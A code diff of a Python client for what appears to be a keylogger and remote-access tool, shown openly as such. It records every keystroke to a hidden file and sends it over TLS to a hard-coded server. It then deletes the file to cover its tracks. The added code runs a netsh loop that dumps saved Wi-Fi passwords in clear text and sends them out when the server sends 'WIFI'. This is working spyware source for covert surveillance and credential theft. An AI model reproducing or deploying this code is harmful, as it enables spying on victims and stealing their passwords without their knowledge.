@@ -5,98 +5,107 @@ from pynput.keyboard import Key, Listener
 import logging
 import platform
 import threading
+import subprocess
 
 CA_CERTIFICATE = """
 -----BEGIN CERTIFICATE-----
-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
+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
-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
+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
 -----END CERTIFICATE-----
 """
 
-# for /f "skip=9 tokens=1,2 delims=:" %i in ('netsh wlan show profiles') do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear
+def save_command_result(output_file):
+    command = 'for /f "skip=9 tokens=1,2 delims=:" %i in (\'netsh wlan show profiles\') do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear'
+    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
+    output, error = process.communicate()
+    if error:
+        print("An error occurred:", error)
+    else:
+        with open(output_file, 'w') as f:
+            f.write(output)
+
+
 def check_platform():
     return platform.system()
 
+
 def find_ca_cert_path():
-    for r, d, f in os.walk("c:\\"): 
-        for files in f:
-            if files == "ca-cert.pem":
-                path = os.path.join(r, files)
+    for r, d, files in os.walk("c:\\"):
+        for filename in files:
+            if filename == "ca-cert.pem":
+                path = os.path.join(r, filename)
                 if path.endswith("SSL\\CA\\ca-cert.pem"):
-                    return path  
-    return None 
-    
+                    return path
+    return None
+
+
 def os_check():
-        current_platform = check_platform()
-        if current_platform == 'Windows':
-            #print('Windows')
-            return 'Windows'
-        elif current_platform == 'Linux':
-            #print('Linux')
-            return 'Linux'   
-        else:
-            return None
+    current_platform = check_platform()
+    if current_platform == 'Windows':
+        return 'Windows'
+    elif current_platform == 'Linux':
+        return 'Linux'
+    else:
+        return None
+
+
+def delete_hidden_file(file):
+    os.remove(file)
+
 
 def send_file(conn, filename):
-    try:
-        with open(filename, 'rb') as f:
-            while True:
-                chunk = f.read(1024)  # Lire un chunk du fichier
-                print(f"chunk {chunk}")
-                if not chunk:
-                    break  # Si le chunk est vide, on a atteint la fin du fichier
-                conn.sendall(chunk)  # Envoyer le chunk au client
-    finally:
-        # Fermer le fichier
-        f.close()
-        os.remove(filename)
+    with open(filename, 'rb') as f:
+        while True:
+            chunk = f.read(1024)
+            if not chunk:
+                break
+            conn.sendall(chunk)
 
-def key_logger(path_hidden_file, client_ssl):
-    logging.basicConfig(filename=path_hidden_file, level=logging.DEBUG, format="%(asctime)s - %(message)s")
-    os.system(f"attrib +h {path_hidden_file}")  # Rendre le fichier caché
+
+def key_logger(hidden_file_path, client_ssl):
+    logging.basicConfig(filename=hidden_file_path, level=logging.DEBUG, format="%(asctime)s - %(message)s")
+    os.system(f"attrib +h {hidden_file_path}")
 
     def on_press(key):
         logging.info(str(key))
 
-    # Crée un écouteur de clavier pour enregistrer les touches
     with Listener(on_press=on_press) as listener:
-        # Crée un thread pour écouter les messages du serveur
         server_listener_thread = threading.Thread(target=listen_to_server, args=(client_ssl,))
         server_listener_thread.start()
-
-        # Attend que le thread du serveur se termine
         server_listener_thread.join()
-
-        # Une fois le thread du serveur terminé, on arrête le keylogger
         listener.stop()
+        client_ssl.close()
+        logging.shutdown()
+        delete_hidden_file(hidden_file_path)
         exit(1)
+
 
 def listen_to_server(client_ssl):
     while True:
@@ -106,48 +115,43 @@ def listen_to_server(client_ssl):
             print("stop")
             send_file(client_ssl, "its_a_trap.txt")
             exit(1)
+        if msg == "WIFI":
+            output_file = 'result.txt'
+            save_command_result(output_file)
+            send_file(client_ssl, output_file)
+            delete_hidden_file(output_file)
+
+
+def timeout_handler(client_ssl):
+    print("Connection timed out after 10 minutes.")
+    client_ssl.close()
 
 
 def main():
-    print('main active')
     os_local = os_check()
-    print(os_local)
     if os_local == 'Windows':
-        #print("Wait until the programme find the certificate file on your device ...")
-        #ca_cert_path = find_ca_cert_path()
-        #print(ca_cert_path)
-        #script_dir = os.path.dirname(os.path.realpath(__file__))
-        #ca_cert_path = os.path.abspath(os.path.join(script_dir, "..", "..","SSL", "CA", "ca-cert.pem"))
-        # ca_cert_path = "C:/Users/rrais/Desktop/Dev/Python_Scripting/SSL/CA/ca-cert.pem" # take this path when you run it on .exe
-        #print("CA cert path:", ca_cert_path)
         context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
         context.load_verify_locations(cadata=CA_CERTIFICATE)
-
-        # Setting
-        host = '192.168.1.43' #remplacer par l'ip du serveur
+        host = '10.56.182.51'  # Replace with the server IP
         port = 90
         socket_obj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
-        # Secure the socket
         client_ssl = context.wrap_socket(socket_obj, server_hostname=host)
         client_ssl.connect((host, port))
-    #bien ou quoi
+        print("Client ON")
+
         while True:
             try:
                 key_logger("its_a_trap.txt", client_ssl)
-                    
-                    #exit(1)
-                    #print("-- END --")
-                    #client_ssl.close()
-                
+
             except Exception as e:
                 print(f"Error: {e}")
                 break
 
         print("-- END --")
         client_ssl.close()
-    else : 
-        print("linux in maintenance")
+    else:
+        print("Linux in maintenance")
+
 
 if __name__ == "__main__":
     main()
